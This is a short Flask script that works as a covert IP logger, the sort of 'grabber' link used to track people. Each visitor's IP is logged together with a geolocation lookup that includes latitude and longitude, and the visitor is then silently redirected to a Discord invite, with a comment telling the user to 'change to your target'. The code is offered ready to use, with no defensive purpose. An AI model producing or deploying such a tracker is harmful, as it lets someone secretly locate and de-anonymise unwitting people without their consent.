from flask import Flask, request, redirect
import datetime, requests

app = Flask(__name__)

REDIRECT_URL = "https://discord.gg/7SxqbdPpyC"  # change to your target

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            return response.json()  # full info, includes lat/lon
        else:
            return None
    except Exception:
        return None

@app.route("/")
def log_ip_and_geo():
    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_header.split(',')[0].strip()  # get first public IP

    geo_info = get_geo_info(ip)

    # Debug print
    print(f"[{datetime.datetime.now()}] IP: {ip} - Geo Info: {geo_info}")

    # Save to file
    with open("ip_geo_log.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - IP: {ip} - Geo Info: {geo_info}\n")

    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
